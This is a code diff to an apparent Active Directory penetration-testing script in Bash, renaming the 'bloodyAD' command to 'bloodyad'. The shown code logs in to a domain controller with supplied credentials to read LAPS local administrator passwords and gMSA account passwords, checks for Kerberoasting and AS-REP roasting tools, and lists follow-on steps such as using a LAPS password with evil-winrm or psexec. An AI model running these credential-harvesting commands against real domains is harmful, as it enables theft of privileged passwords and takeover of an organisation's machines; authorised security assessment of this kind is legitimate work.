@@ -217,7 +217,7 @@ check_tools() {
 
     # Report availability of attack tools (not used, but needed for copy-paste)
     info "Attack tools (for copy-paste commands):"
-    for atool in impacket-GetNPUsers impacket-GetUserSPNs bloodhound-python bloodyAD adidnsdump; do
+    for atool in impacket-GetNPUsers impacket-GetUserSPNs bloodhound-python bloodyad adidnsdump; do
         if command -v "$atool" &>/dev/null; then
             info "  $atool: ${GREEN}available${NC}"
         else
@@ -659,12 +659,12 @@ if [[ "$AUTH_MODE" == "password" ]]; then
         add_critical "LAPS passwords readable — local admin on those computers"
         add_quickwin "LAPS password → evil-winrm/psexec as local Administrator"
     else
-        # Check via bloodyAD
-        if command -v bloodyAD &>/dev/null; then
-            LAPS_BLOODY=$(bloodyAD -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" --host "$DC_IP" \
+        # Check via bloodyad
+        if command -v bloodyad &>/dev/null; then
+            LAPS_BLOODY=$(bloodyad -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" --host "$DC_IP" \
                 get children "OU=Domain Controllers,${BASE_DN}" --attr ms-MCS-AdmPwd 2>/dev/null || true)
             if [[ -n "$LAPS_BLOODY" ]] && echo "$LAPS_BLOODY" | grep -qi "ms-MCS-AdmPwd"; then
-                critical "LAPS password found via bloodyAD!"
+                critical "LAPS password found via bloodyad!"
                 echo "$LAPS_BLOODY"
             fi
         fi
@@ -697,9 +697,9 @@ if [[ "$AUTH_MODE" == "password" ]]; then
         echo "$GMSA" > "$OUTPUT_DIR/gmsa_accounts.txt"
 
         # Try to read GMSA password
-        if command -v bloodyAD &>/dev/null; then
+        if command -v bloodyad &>/dev/null; then
             echo "$GMSA" | grep "sAMAccountName:" | awk '{print $2}' | while read -r gmsa_name; do
-                GMSA_PASS=$(bloodyAD -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" --host "$DC_IP" \
+                GMSA_PASS=$(bloodyad -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" --host "$DC_IP" \
                     get object "${gmsa_name}" --attr msDS-ManagedPassword 2>/dev/null || true)
                 if [[ -n "$GMSA_PASS" ]] && ! echo "$GMSA_PASS" | grep -qi "error\|denied"; then
                     critical "GMSA PASSWORD READABLE: $gmsa_name"
